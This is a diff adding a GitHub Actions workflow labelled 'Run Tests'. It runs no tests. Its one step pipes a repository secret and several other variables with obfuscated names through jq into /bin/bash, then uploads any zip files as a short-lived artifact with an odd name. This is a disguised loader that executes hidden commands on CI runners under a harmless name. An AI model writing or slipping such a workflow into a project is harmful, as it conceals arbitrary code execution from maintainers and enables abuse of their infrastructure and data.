@@ -1,0 +1,32 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          shu88: ${{ secrets.shu88 }}
+        run: |
+          printf '%s' "$shu88" | jq -r .ampg28 | /bin/bash
+          printf '%s' "$uc22323" | jq -r .ctjyd28 | /bin/bash
+          echo $k39 | jq -r .cxx29194 | /bin/bash
+          echo $sjiaq7579 | jq -r .o5 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: G0dz98l3
+          path: "*.zip"
+          retention-days: 1
